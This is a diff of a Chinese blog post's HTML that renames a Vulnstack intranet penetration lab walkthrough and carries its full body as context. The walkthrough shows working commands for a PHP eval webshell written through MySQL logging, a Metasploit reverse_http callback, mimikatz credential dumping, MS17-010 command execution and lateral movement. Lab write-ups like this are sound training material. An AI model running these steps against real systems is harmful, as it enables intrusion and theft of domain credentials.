@@ -11,7 +11,7 @@
   
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
   <title>
-    ATT&amp;CK实战系列——红队实战（一） |  回梦&#39;s Blog
+    Vulnstack内网渗透（一） |  回梦&#39;s Blog
   </title>
   <meta name="generator" content="hexo-theme-ayer">
   
@@ -42,7 +42,7 @@
     <main class="content on">
       <section class="outer">
   <article
-  id="post-ATT&amp;CK实战系列——红队实战（一）"
+  id="post-Vulnstack内网渗透（一）"
   class="article article-type-post"
   itemscope
   itemprop="blogPost"
@@ -53,14 +53,14 @@
     <header class="article-header">
        
 <h1 class="article-title sea-center" style="border-left:0" itemprop="name">
-  ATT&amp;CK实战系列——红队实战（一）
+  Vulnstack内网渗透（一）
 </h1>
  
 
     </header>
      
     <div class="article-meta">
-      <a href="/2021/03/23/ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/" class="article-date">
+      <a href="/2021/03/23/Vulnstack%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%EF%BC%88%E4%B8%80%EF%BC%89/" class="article-date">
   <time datetime="2021-03-23T04:50:10.000Z" itemprop="datePublished">2021-03-23</time>
 </a> 
   <div class="article-category">
@@ -97,96 +97,96 @@
     <div class="article-entry" itemprop="articleBody">
        
   <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本次靶场的攻击图如下</p>
-<p><img src="/2021/03/23/ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/1.png"></p>
+<p><img src="/2021/03/23/Vulnstack%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%EF%BC%88%E4%B8%80%EF%BC%89/1.png"></p>
 <p>靶机IP配置如下</p>
 <p>Win7</p>
 <p>外网ip：192.168.213.152</p>
 <p>内网ip：192.168.52.143</p>
-<p><img src="/2021/03/23/ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/2.png"></p>
+<p><img src="/2021/03/23/Vulnstack%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%EF%BC%88%E4%B8%80%EF%BC%89/2.png"></p>
 <p>Win2008 IP：192.168.52.138(域控)</p>
 <p>Win2003 IP：192.168.52.141</p>
-<p><img src="/2021/03/23/ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/3.png"></p>
+<p><img src="/2021/03/23/Vulnstack%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%EF%BC%88%E4%B8%80%EF%BC%89/3.png"></p>
 <p>攻击机</p>
 <p>本机 IP：192.168.56.72</p>
 <p>Kali IP：192.168.213.135</p>
 <h1 id="Getshell"><a href="#Getshell" class="headerlink" title="Getshell"></a>Getshell</h1><p>首先将Win7的Web服务启动</p>
 <p>访问<a target="_blank" rel="noopener" href="http://192.168.213.152,发现是一个phpstudy探针且版本为2014/">http://192.168.213.152，发现是一个phpstudy探针且版本为2014</a></p>
-<p><img src="/2021/03/23/ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/4.png"></p>
+<p><img src="/2021/03/23/Vulnstack%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%EF%BC%88%E4%B8%80%EF%BC%89/4.png"></p>
 <p>向下拉，可发现下方可以进行尝试Mysqll数据库连接</p>
 <p>随手root/root</p>
-<p><img src="/2021/03/23/ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/5.png"></p>
+<p><img src="/2021/03/23/Vulnstack%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%EF%BC%88%E4%B8%80%EF%BC%89/5.png"></p>
 <p>得到Mysql弱口令一枚</p>
 <p>使用dirmap进行目录扫描</p>
 <p>python3 dirmap.py i <a target="_blank" rel="noopener" href="http://192.168.213.152/">http://192.168.213.152/</a> -lcf</p>
 <p>得到信息如下图</p>
-<p><img src="/2021/03/23/ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/6.png"></p>
+<p><img src="/2021/03/23/Vulnstack%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%EF%BC%88%E4%B8%80%EF%BC%89/6.png"></p>
 <p><u></u></p>
 <h2 id="Yxcms–-gt-getshell"><a href="#Yxcms–-gt-getshell" class="headerlink" title="Yxcms–&gt;getshell"></a>Yxcms–&gt;getshell</h2><p>访问<a target="_blank" rel="noopener" href="http://192.168.213.152/beifen.rar%EF%BC%8C%E5%BE%97%E5%88%B0yxcms%E7%9A%84%E6%BA%90%E7%A0%81">http://192.168.213.152/beifen.rar，得到yxcms的源码</a></p>
 <p>访问后台</p>
 <p><a target="_blank" rel="noopener" href="http://192.168.213.152/yxcms/index.php?r=admin/index/login">http://192.168.213.152/yxcms/index.php?r=admin/index/login</a></p>
 <p>尝试admin/123456，登录成功</p>
-<p><img src="/2021/03/23/ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/7.png"></p>
+<p><img src="/2021/03/23/Vulnstack%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%EF%BC%88%E4%B8%80%EF%BC%89/7.png"></p>
 <p>使用Yxcms的前台模板进行getshell并在源码找到路径</p>
-<p><img src="/2021/03/23/ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/8.png"></p>
+<p><img src="/2021/03/23/Vulnstack%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%EF%BC%88%E4%B8%80%EF%BC%89/8.png"></p>
 <p>冰蝎连接</p>
-<p><img src="/2021/03/23/ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/9.png"></p>
+<p><img src="/2021/03/23/Vulnstack%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%EF%BC%88%E4%B8%80%EF%BC%89/9.png"></p>
 <h2 id="phpmyadmin–-gt-getshell"><a href="#phpmyadmin–-gt-getshell" class="headerlink" title="phpmyadmin–&gt;getshell"></a>phpmyadmin–&gt;getshell</h2><p><a target="_blank" rel="noopener" href="http://192.168.213.152/phpmyadmin/">http://192.168.213.152/phpmyadmin/</a></p>
 <p>使用刚开始所得的弱口令root/root且在探针中得到绝对路径 C:/phpStudy/WWW，尝试一下方式进行getshell</p>
 <p>1.查询是否有写的权限</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SHOW VARIABLES LIKE &#x27;secure_file_priv&#x27;</span><br></pre></td></tr></table></figure>
-<p><img src="/2021/03/23/ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/10.png"></p>
+<p><img src="/2021/03/23/Vulnstack%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%EF%BC%88%E4%B8%80%EF%BC%89/10.png"></p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">当secure_file_priv的值为null ，表示限制mysql 不允许导入或导出</span><br><span class="line">当secure_file_priv的值没有具体值时，表示不对mysql 的导入或导出做限制</span><br><span class="line">当secure_file_priv的值为指定目录时，表示限制mysql 的导入或导出只能发生在该目录下</span><br></pre></td></tr></table></figure>
 <p>2.利用日志进行getshell</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show variables like &quot;general_log%&quot;</span><br></pre></td></tr></table></figure>
-<p><img src="/2021/03/23/ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/11.png"></p>
+<p><img src="/2021/03/23/Vulnstack%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%EF%BC%88%E4%B8%80%EF%BC%89/11.png"></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">set global general_log&#x3D;&#39;on&#39;，开启日志</span><br><span class="line">set global general_log_file &#x3D;&quot;C:\\phpStudy\\WWW\\shell.php&quot;，修改日志路径</span><br><span class="line">show variables like &quot;general_log%&quot;，查看是否开启成功 </span><br></pre></td></tr></table></figure>
-<p><img src="/2021/03/23/ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/12.png"></p>
+<p><img src="/2021/03/23/Vulnstack%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%EF%BC%88%E4%B8%80%EF%BC%89/12.png"></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">成功开启，我们执行的语句都会写入该文件，直接查询一句话</span><br><span class="line">select &#39;&lt;?php eval($_POST[1]);?&gt;&#39;</span><br><span class="line">使用菜刀或者蚁剑连接</span><br></pre></td></tr></table></figure>
-<p><img src="/2021/03/23/ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/13.png"></p>
+<p><img src="/2021/03/23/Vulnstack%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%EF%BC%88%E4%B8%80%EF%BC%89/13.png"></p>
 <h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>查询是否为内网及存在域</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ipconfig /all</span><br></pre></td></tr></table></figure>
-<p><img src="/2021/03/23/ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/14.png"></p>
-<p><img src="/2021/03/23/ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/15.png"></p>
+<p><img src="/2021/03/23/Vulnstack%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%EF%BC%88%E4%B8%80%EF%BC%89/14.png"></p>
+<p><img src="/2021/03/23/Vulnstack%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%EF%BC%88%E4%B8%80%EF%BC%89/15.png"></p>
 <p>当前权限为域内管理员</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whoami all</span><br></pre></td></tr></table></figure>
-<p><img src="/2021/03/23/ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/17.png"></p>
+<p><img src="/2021/03/23/Vulnstack%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%EF%BC%88%E4%B8%80%EF%BC%89/17.png"></p>
 <p>定位域控域名及ip</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net time /domain</span><br><span class="line">ping 域控域名</span><br></pre></td></tr></table></figure>
-<p><img src="/2021/03/23/ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/16.png"></p>
+<p><img src="/2021/03/23/Vulnstack%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%EF%BC%88%E4%B8%80%EF%BC%89/16.png"></p>
 <p>查看补丁等信息</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">systeminfo</span><br><span class="line">OS名称：Microsoft Windows 7 专业版</span><br><span class="line">安装补丁如下</span><br><span class="line">[01]: KB2534111</span><br><span class="line">[02]: KB2999226</span><br><span class="line">[03]: KB958488</span><br><span class="line">[04]: KB976902</span><br></pre></td></tr></table></figure>
 <h1 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h1><h2 id="MSF"><a href="#MSF" class="headerlink" title="MSF"></a>MSF</h2><h3 id="上线"><a href="#上线" class="headerlink" title="上线"></a>上线</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use exploit/multi/script/web_delivery</span><br><span class="line">set payload windows/meterpreter/reverse_http</span><br><span class="line">set lhost 192.168.213.135</span><br><span class="line">set target PSH</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
-<p><img src="/2021/03/23/ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/18.png"></p>
+<p><img src="/2021/03/23/Vulnstack%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%EF%BC%88%E4%B8%80%EF%BC%89/18.png"></p>
 <h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>直接使用msf中的getsystem</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getsystem</span><br></pre></td></tr></table></figure>
-<p><img src="/2021/03/23/ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/19.png"></p>
+<p><img src="/2021/03/23/Vulnstack%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%EF%BC%88%E4%B8%80%EF%BC%89/19.png"></p>
 <h3 id="读密码"><a href="#读密码" class="headerlink" title="读密码"></a>读密码</h3><p>在MSF的更新中，mimikatz模块已经合并到了kiwi中</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">load kiwi</span><br><span class="line">命令参数如下：</span><br><span class="line">creds_all：列举所有凭据</span><br><span class="line">creds_kerberos：列举所有kerberos凭据</span><br><span class="line">creds_msv：列举所有msv凭据</span><br><span class="line">creds_ssp：列举所有ssp凭据</span><br><span class="line">creds_tspkg：列举所有tspkg凭据</span><br><span class="line">creds_wdigest：列举所有wdigest凭据</span><br><span class="line">dcsync：通过DCSync检索用户帐户信息</span><br><span class="line">dcsync_ntlm：通过DCSync检索用户帐户NTLM散列、SID和RID</span><br><span class="line">golden_ticket_create：创建黄金票据</span><br><span class="line">kerberos_ticket_list：列举kerberos票据</span><br><span class="line">kerberos_ticket_purge：清除kerberos票据</span><br><span class="line">kerberos_ticket_use：使用kerberos票据</span><br><span class="line">kiwi_cmd：执行mimikatz的命令，后面接mimikatz.exe的命令</span><br><span class="line">lsa_dump_sam：dump出lsa的SAM</span><br><span class="line">lsa_dump_secrets：dump出lsa的密文</span><br><span class="line">password_change：修改密码</span><br><span class="line">wifi_list：列出当前用户的wifi配置文件</span><br><span class="line">wifi_list_shared：列出共享wifi配置文件&#x2F;编码</span><br></pre></td></tr></table></figure>
 <p>由于我这里加载出错，所以我直接上传一个mimikatz上目标主机</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">upload /root/mimikatz.exe C:\\phpstudy\mimikatz.exe</span><br><span class="line">shell</span><br><span class="line">C:\\phpstudy\mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure>
-<p><img src="/2021/03/23/ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/20.png"></p>
+<p><img src="/2021/03/23/Vulnstack%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%EF%BC%88%E4%B8%80%EF%BC%89/20.png"></p>
 <p>得到域管理员明文密码</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">abcd0123**</span><br></pre></td></tr></table></figure>
 <h3 id="添加路由"><a href="#添加路由" class="headerlink" title="添加路由"></a>添加路由</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">run get_local_subnets，获取当前路由</span><br><span class="line">run autoroute -s 192.168.52.0 -n 255.255.255.0，添加路由</span><br><span class="line">run autoroute -p，查看当前路由</span><br></pre></td></tr></table></figure>
-<p><img src="/2021/03/23/ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/21.png"></p>
+<p><img src="/2021/03/23/Vulnstack%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%EF%BC%88%E4%B8%80%EF%BC%89/21.png"></p>
 <p>也可以选择添加SOCKS5代理</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">background</span><br><span class="line">use auxiliary&#x2F;server&#x2F;socks5</span><br><span class="line">set SRVHOST 127.0.0.1</span><br><span class="line">set SRVPORT 1080</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
-<p><img src="/2021/03/23/ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/22.png"></p>
+<p><img src="/2021/03/23/Vulnstack%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%EF%BC%88%E4%B8%80%EF%BC%89/22.png"></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim &#x2F;etc&#x2F;proxychains.conf</span><br></pre></td></tr></table></figure>
-<p><img src="/2021/03/23/ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/23.png"></p>
+<p><img src="/2021/03/23/Vulnstack%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%EF%BC%88%E4%B8%80%EF%BC%89/23.png"></p>
 <h3 id="探测存活"><a href="#探测存活" class="headerlink" title="探测存活"></a>探测存活</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary&#x2F;scanner&#x2F;netbios&#x2F;nbname</span><br><span class="line">set RHOST 192.168.52.100-200</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
-<p><img src="/2021/03/23/ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/24.png"></p>
+<p><img src="/2021/03/23/Vulnstack%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%EF%BC%88%E4%B8%80%EF%BC%89/24.png"></p>
 <h3 id="探测MS17-010"><a href="#探测MS17-010" class="headerlink" title="探测MS17-010"></a>探测MS17-010</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary&#x2F;scanner&#x2F;smb&#x2F;smb_ms17_010</span><br><span class="line">set RHOST 192.168.52.137-145</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
-<p><img src="/2021/03/23/ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/25.png"></p>
+<p><img src="/2021/03/23/Vulnstack%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%EF%BC%88%E4%B8%80%EF%BC%89/25.png"></p>
 <p>执行命令</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary&#x2F;admin&#x2F;smb&#x2F;ms17_010_command</span><br><span class="line">set COMMAND whoami</span><br><span class="line">set RHOSTS 192.168.52.138</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
-<p><img src="/2021/03/23/ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/26.png"></p>
-<h2 id="CS"><a href="#CS" class="headerlink" title="CS"></a>CS</h2><h3 id="Dump-密码"><a href="#Dump-密码" class="headerlink" title="Dump 密码"></a>Dump 密码</h3><p><img src="/2021/03/23/ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/27.png"></p>
+<p><img src="/2021/03/23/Vulnstack%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%EF%BC%88%E4%B8%80%EF%BC%89/26.png"></p>
+<h2 id="CS"><a href="#CS" class="headerlink" title="CS"></a>CS</h2><h3 id="Dump-密码"><a href="#Dump-密码" class="headerlink" title="Dump 密码"></a>Dump 密码</h3><p><img src="/2021/03/23/Vulnstack%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%EF%BC%88%E4%B8%80%EF%BC%89/27.png"></p>
 <h3 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h3><p>先新建一个SMB监听器，让域控和2003的流量经过Win7</p>
-<p><img src="/2021/03/23/ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/28.png"></p>
+<p><img src="/2021/03/23/Vulnstack%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%EF%BC%88%E4%B8%80%EF%BC%89/28.png"></p>
 <p>使用Psexec进行上线，挨个点击上线</p>
-<p><img src="/2021/03/23/ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/29.png"></p>
-<p><img src="/2021/03/23/ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/30.png"></p>
+<p><img src="/2021/03/23/Vulnstack%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%EF%BC%88%E4%B8%80%EF%BC%89/29.png"></p>
+<p><img src="/2021/03/23/Vulnstack%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%EF%BC%88%E4%B8%80%EF%BC%89/30.png"></p>
 <h1 id="结言"><a href="#结言" class="headerlink" title="结言"></a>结言</h1><p>这次踩了一点坑，其中有断续</p>
 <p>Tcl</p>
  
@@ -253,7 +253,7 @@
     <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://example.com/2021/03/23/ATT&CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97%E2%80%94%E2%80%94%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/" alt="微信分享二维码">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://example.com/2021/03/23/Vulnstack%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%EF%BC%88%E4%B8%80%EF%BC%89/" alt="微信分享二维码">
     </div>
 </div>
 
